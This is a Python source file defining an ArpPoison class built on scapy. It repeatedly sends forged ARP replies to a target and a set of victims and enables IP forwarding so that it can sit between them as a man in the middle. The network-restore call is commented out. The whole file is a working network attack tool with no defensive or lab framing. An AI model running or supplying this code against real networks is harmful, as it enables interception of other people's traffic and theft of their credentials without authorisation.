import os
import threading
import time

from scapy.all import *
from scapy.layers.l2 import Ether, ARP


class ArpPoison():
    stop = False

    def __init__(self, target, victims):
        # Contains IP of target
        self.target_ip = target
        self.target_mac = self._get_mac(self.target_ip)
        # Contains IP of all victims
        self._victims = victims

    def add_victim(self, new_victim):
        self._victims.add(new_victim)

    def remove_victim(self, victim):
        self._victims.remove(victim)

    def _get_mac(self, ip):
        resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip))
        for s, r in resp:
            return r[ARP].hwsrc
        return None

    def _poison(self):
        while (self.stop == False):
            for victim_ip in self._victims:
                # Send ARP reply with false IP and MAC address information
                victim_mac = self._get_mac(victim_ip)
                send(ARP(op=2, pdst=self.target_ip,
                         hwdst=self.target_mac, psrc=victim_ip))
                send(ARP(op=2, pdst=victim_ip,
                         hwdst=victim_mac, psrc=self.target_ip))
                print("poisoning")
                print(victim_ip)

            # TODO: make sleep time configurable
            time.sleep(2)
            if (self.stop == True):
                print("Stopping ARP poisoning..")
                break

    def stop_poisoning(self):
        self.stop = True
        print('stopping')
        # self.restore_network()

    def start_poisoning(self):
        self.stop = False
        print('starting')
        os.system("sysctl -w net.ipv4.ip_forward=1")
        thread = threading.Thread(target=self._poison)
        thread.start()
